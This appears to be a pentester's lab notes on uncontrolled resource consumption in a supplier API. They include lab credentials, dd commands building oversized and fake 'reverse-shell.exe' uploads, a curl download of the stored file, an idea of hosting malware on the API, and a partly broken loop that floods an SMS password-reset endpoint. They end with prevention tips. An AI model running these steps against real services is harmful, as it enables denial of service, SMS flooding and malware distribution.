CWE-400: Uncontrolled Resource Consumption
- Fails to limit user-initiated requests that consume resources such as network bandwidth, CPU, memory, and storage.
```
htbpentester8@pentestercompany.com:HTBPentester8
```
- /api/v1/authentication/suppliers/sign-in
- /api/v1/roles/current-user
  - SupplierCompanies_Get
  - SupplierCompanies_UploadCertificateOfIncorporation
    - /api/v1/supplier-companies/certificates-of-incorporation POST allows the staff to upload PDF on disk indefinitely
   
1. Get supplier company ID of current user
```
/api/v1/supplier-companies/current-user
```
2. Create large pdf file
```
dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
```
3. Upload the file to /api/v1/supplier-companies/certificates-of-incorporation POST (we notice we can upload files of any size and can cause DoS)
4. Test the upload of other file extensions
```
dd if=/dev/urandom of=reverse-shell.exe bs=1M count=10
```
5. Execute the reverse shell
```
curl -O http://94.237.51.179:51135/SupplierCompaniesCertificatesOfIncorporations/reverse-shell.exe
```
- We can utilize this API as cloud storage for malware that could be distributed to victims


**Prevention
- Validate size, extension, and content of uploaded files.
- Antivirus scanning tools (ClamAV: https://www.clamav.net/)
- Enforce robust authentication and authorization for public directories such as wwwroot.


Another resource consumption:
- /api/v1/authentication/passwords/reset/sms-otp
```
for i in {1..100}; do
  'http://83.136.251.105:33511/api/v1/authentication/customers/passwords/resets/sms-otps' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "MasonJenkins@ymail.com"
  }'
done
```
